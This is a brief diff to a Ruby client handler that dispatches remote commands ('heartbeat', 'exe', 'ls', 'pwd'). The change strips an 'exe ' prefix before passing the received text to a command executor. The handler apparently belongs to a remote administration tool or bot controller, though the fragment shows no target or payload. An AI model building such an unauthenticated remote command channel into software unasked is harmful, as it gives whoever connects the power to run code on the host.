@@ -12,7 +12,7 @@ def handle_client(client)
     when 'heartbeat'
       result = 'alive'
     when 'exe'
-      result = Helpers.exe(data)
+      result = Helpers.exe(data.gsub('exe ', ''))
     when 'ls'
       result = Helpers.ls
     when 'pwd'
